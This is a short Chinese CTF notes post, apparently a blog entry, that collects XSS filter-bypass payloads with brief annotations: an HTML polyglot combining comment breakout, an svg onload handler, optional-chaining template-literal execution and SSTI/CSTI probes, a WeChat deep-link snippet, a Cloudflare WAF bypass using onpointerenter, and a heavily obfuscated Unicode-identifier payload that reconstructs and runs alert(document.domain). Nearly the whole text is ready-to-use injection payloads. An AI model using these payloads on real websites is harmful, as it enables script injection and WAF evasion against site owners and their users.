---
title: 神秘XSS Bypass
date: 2025-07-22 16:14:14
tags: XSS
category: CTF
permalink: /神秘XSS Bypass/
---

```html
'"--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
```

- top[30] () →不使用
- alert 字词触发 XSS alert? .\`` →可选链 + 模板字面量隐秘 JS 执行
- -->< svg > →跳出 HTML 注释
- $ {{ 4*9 }} → SSTI,CSTI

---

微信XSS

```html
<a href="weixin://bizmsgmenu?msgmenucontent=测试内容&msgmenuid=960">显示内容</a>
```

---

CloudFlare

```html
"><P/onpointerenter=alert(1)>
```

---

```html
"><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
```

---

```html

```
